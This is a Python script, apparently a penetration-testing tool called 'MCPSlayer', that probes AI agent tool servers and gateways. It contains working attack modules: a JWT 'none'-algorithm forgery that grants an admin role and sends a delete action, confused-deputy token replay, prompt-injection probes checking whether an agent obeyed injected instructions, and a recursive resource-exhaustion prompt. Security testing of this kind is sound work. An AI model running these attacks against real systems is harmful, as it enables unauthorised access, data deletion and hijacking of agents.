import requests
import jwt
import argparse
import yaml
import time
from oauthlib.oauth2 import BackendApplicationClient
from requests_oauthlib import OAuth2Session

class AuthProvider:
    """Base class for handling different auth contexts."""
    def get_auth_headers(self):
        return {}

class JWTProvider(AuthProvider):
    def __init__(self, token, secret=None, alg="RS256"):
        self.token = token
        self.secret = secret
        self.alg = alg

    def get_auth_headers(self):
        return {"Authorization": f"Bearer {self.token}"}

    def tamper(self, modifications):
        """Attempts to manipulate JWT claims."""
        decoded = jwt.decode(self.token, options={"verify_signature": False})
        decoded.update(modifications)
        # Attempt 'none' algorithm exploit or re-sign with weak secret
        return jwt.encode(decoded, key=self.secret or "", algorithm="none")

class OAuth2Provider(AuthProvider):
    def __init__(self, client_id, client_secret, token_url):
        self.client = BackendApplicationClient(client_id=client_id)
        self.oauth = OAuth2Session(client=self.client)
        self.token = self.oauth.fetch_token(token_url=token_url, 
                                           client_id=client_id, 
                                           client_secret=client_secret)

    def get_auth_headers(self):
        return {"Authorization": f"Bearer {self.token['access_token']}"}

class MCPSlayer:
    def __init__(self, config_path):
        with open(config_path, 'r') as f:
            self.config = yaml.safe_load(f)
        self.auth = self._init_auth()
        self.session = requests.Session()
        self.session.headers.update(self.auth.get_auth_headers())

    def _init_auth(self):
        a = self.config['auth']
        if a['type'] == 'jwt':
            return JWTProvider(a['token'], a.get('secret'))
        if a['type'] == 'oauth2':
            return OAuth2Provider(a['id'], a['secret'], a['url'])
        return AuthProvider()

    # --- [ATTACK MODULES] ---

    def test_confused_deputy(self):
        """[MCP-02] Test token reuse across tool boundaries."""
        print("\n[!] Starting Confused Deputy Probe...")
        for tool in self.config['targets']['tools']:
            print(f"[*] Replaying context to tool: {tool['name']} ({tool['url']})")
            r = self.session.post(f"{tool['url']}/execute", json={"action": "list_all"})
            self._log_vulnerability(r, f"Token Acceptance at {tool['name']}")

    def test_prompt_injection_exfil(self):
        """[MCP-01/08] Test Indirect Injection & SSRF via LLM."""
        print("\n[!] Starting Prompt/Tool Exfiltration Probe...")
        for payload in self.config['payloads']['injection']:
            print(f"[*] Testing Payload: {payload['name']}")
            r = self.session.post(f"{self.config['targets']['gateway']}/invoke", 
                                 json={"prompt": payload['string']})
            # We look for "Canary" tokens in the tool outputs or side-channels
            if payload['canary'] in r.text:
                print(f"  [🚨] VULNERABLE: Agent executed injected instruction!")

    def test_jwt_none_algorithm(self):
        """[MCP-12] Attempt to bypass auth using 'none' algorithm."""
        if not isinstance(self.auth, JWTProvider): return
        print("\n[!] Starting JWT 'None' Algorithm Attack...")
        tampered = self.auth.tamper({"role": "admin", "team": "security"})
        headers = {"Authorization": f"Bearer {tampered}"}
        r = requests.post(f"{self.config['targets']['tools'][0]['url']}/execute", 
                          headers=headers, json={"action": "delete"})
        self._log_vulnerability(r, "JWT None-Alg Acceptance")

    def test_dos_recursion(self):
        """[MCP-14] Test for Resource Exhaustion/Infinite Loops."""
        print("\n[!] Starting Resource Exhaustion/Recursion Probe...")
        recursive_prompt = "Perform action X, take the result, and perform action X again. Repeat 100 times."
        start_time = time.time()
        r = self.session.post(f"{self.config['targets']['gateway']}/invoke", 
                             json={"prompt": recursive_prompt})
        duration = time.time() - start_time
        print(f"[*] Request took {duration:.2f}s. Monitoring for timeout/cost spikes.")

    def _log_vulnerability(self, r, test_name):
        if r.status_code in [200, 201]:
            print(f"  [🚨] VULNERABLE: {test_name} (Status: {r.status_code})")
        else:
            print(f"  [✓] Blocked: {test_name} (Status: {r.status_code})")

if __name__ == "__main__":
    # Example usage: python slayer.py --config my_pentest.yaml
    parser = argparse.ArgumentParser()
    parser.add_argument("--config", default="config.yaml")
    args = parser.parse_args()
    
    slayer = MCPSlayer(args.config)
    slayer.test_confused_deputy()
    slayer.test_jwt_none_algorithm()
    slayer.test_prompt_injection_exfil()
